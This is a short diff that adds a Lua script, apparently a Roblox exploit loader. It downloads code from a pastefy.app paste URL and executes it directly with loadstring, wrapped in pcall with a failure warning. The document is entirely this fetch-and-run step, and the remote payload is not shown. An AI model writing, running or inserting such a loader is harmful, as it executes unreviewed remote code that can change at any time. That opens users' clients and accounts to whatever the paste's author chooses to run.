@@ -1,0 +1,7 @@
+local success, err = pcall(function()
+    loadstring(game:HttpGet("https://pastefy.app/YiGY38uo/raw"))()
+end)
+
+if not success then
+    warn("Execution failed: " .. tostring(err))
+end
